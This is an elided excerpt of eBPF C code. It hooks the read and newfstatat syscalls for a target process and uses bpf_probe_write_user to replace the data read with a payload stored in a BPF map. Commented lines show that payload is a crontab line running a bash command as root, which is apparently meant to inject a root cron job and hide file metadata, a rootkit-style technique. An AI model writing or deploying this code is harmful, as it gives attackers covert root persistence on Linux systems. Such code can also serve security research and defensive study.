...
struct {
	...
	__type(value, struct payloadMap); 
} BPF_MAP_NAME SEC(".maps");
...
// char PAYLOAD_BRK[]="* * * * * root  /bin/bash -c \"echo 114514 >> /tmp/naive \" \n#";
// char PAYLOAD[100]="* * * * * root  /bin/bash -c \"echo 114514 >> /tmp/naive \" \n#";
...
static __inline int handle_exit_read(struct pt_regs *regs,unsigned long ret,unsigned int pid)
{
	...
	if(*exists==1)
	{
		unsigned int bpf_key_id = BPF_KEY_ID;
		struct payloadMap* data = bpf_map_lookup_elem(&BPF_MAP_NAME, &bpf_key_id);
		if (data) {
			bpf_printk("%s",data->payload);
			//bpf_printk("READING! target fd:%d read %d bytes\n",fd,readlen);
			if(readlen>sizeof(data->payload))
			{
				//bpf_printk("writing payload\n");
				char* buf=(char *)PT_REGS_PARM2_CORE(regs);
				bpf_probe_write_user((void *)(buf),data->payload, sizeof(data->payload));
				// bpf_probe_write_user((void *)(buf),data->payload, calculate_size(data->payload));
			}
		}	
	}
    return 0;
...
static __inline int handle_exit_newfstatat(struct pt_regs *regs,unsigned long ret,unsigned int pid)
{
	...
	if(thisistarget)
	{
		struct stat *statbuf_ptr=(struct stat *)PT_REGS_PARM3_CORE(regs);
